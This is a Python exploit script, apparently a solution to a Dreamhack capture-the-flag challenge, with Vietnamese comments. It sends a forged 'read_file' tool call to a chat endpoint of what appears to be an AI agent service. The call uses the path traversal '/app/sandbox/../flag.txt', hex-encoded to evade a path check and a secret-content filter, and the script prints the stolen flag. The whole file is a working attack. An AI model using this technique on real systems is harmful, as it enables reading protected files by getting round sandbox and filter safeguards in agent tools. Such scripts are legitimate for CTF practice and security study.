import requests
import json
import sys

TARGET_URL = "http://host1.dreamhack.games:20975"
CHAT_ENDPOINT = f"{TARGET_URL}/chat"

def send_command(payload: dict) -> dict:
    """Tạo một chuỗi JSON từ payload, gửi nó và trả về phản hồi JSON."""
    command_str = json.dumps(payload)
    post_data = {"message": command_str, "persona": ""}
    try:
        response = requests.post(CHAT_ENDPOINT, json=post_data, timeout=15)
        response.raise_for_status()
        return response.json()
    except requests.exceptions.RequestException as e:
        print(f"\n[!] Lỗi kết nối: {e}")
        sys.exit(1)

def main():
    
    # --- Tấn công trong một bước duy nhất ---
    print("[*] Xây dựng payload Path Traversal và mã hóa nó...")
    
    # Đường dẫn tấn công để bypass hàm _allowed
    traversal_path = "/app/sandbox/../flag.txt"
    
    # Mã hóa toàn bộ đường dẫn sang hex để bypass bộ lọc 'contains_secret_like'
    path_in_hex = traversal_path.encode('utf-8').hex()
    
    print(f"[+] Đường dẫn tấn công: {traversal_path}")
    print(f"[+] Đường dẫn được mã hóa hex: {path_in_hex}")
    
    # Tạo payload cuối cùng
    read_file_payload = {
        "tool": "read_file",
        "args": {
            "path_hex": path_in_hex
        }
    }
    
    print("\n[*] Gửi payload tấn công...")
    response_data = send_command(read_file_payload)
    
    if response_data.get("status") == "ok":
        flag = response_data.get("result", "").strip()
        if flag:
            print("\n[!] TẤN CÔNG THÀNH CÔNG!")
            print(f"[+] Flag: {flag}")
        else:
            print("[-] Lệnh thành công nhưng không nhận được nội dung cờ.")
    else:
        print(f"[-] Đọc file thất bại. Phản hồi từ server: {response_data}")

if __name__ == "__main__":
    main()